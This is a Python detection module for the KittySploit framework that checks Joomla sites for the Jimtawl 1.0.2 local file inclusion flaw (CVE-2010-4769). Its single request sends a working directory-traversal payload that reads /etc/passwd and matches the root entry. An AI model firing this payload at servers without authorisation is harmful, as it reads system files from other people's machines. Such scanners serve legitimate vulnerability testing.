#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A directory traversal vulnerability in the Jimtawl (com_jimtawl) component 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Joomla! Component Jimtawl 1.0.2 - Local File Inclusion Detection',
        'description': 'A directory traversal vulnerability in the Jimtawl (com_jimtawl) component 1.0.2 Joomla! allows remote attackers to read arbitrary files and possibly unspecified other impacts via a .. (dot dot) in the task parameter to index.php.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2010', 'joomla', 'lfi', 'edb', 'janguo', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://www.exploit-db.com/exploits/15585', 'https://nvd.nist.gov/vuln/detail/CVE-2010-4769'],
        'cve': 'CVE-2010-4769',
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?option=com_jimtawl&Itemid=12&task=../../../../../../../../../../../../etc/passwd%00', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Joomla! Component Jimtawl 1.0.2 - Local File Inclusion detected",
                path='/index.php?option=com_jimtawl&Itemid=12&task=../../../../../../../../../../../../etc/passwd%00',
            )
            return True
        return False

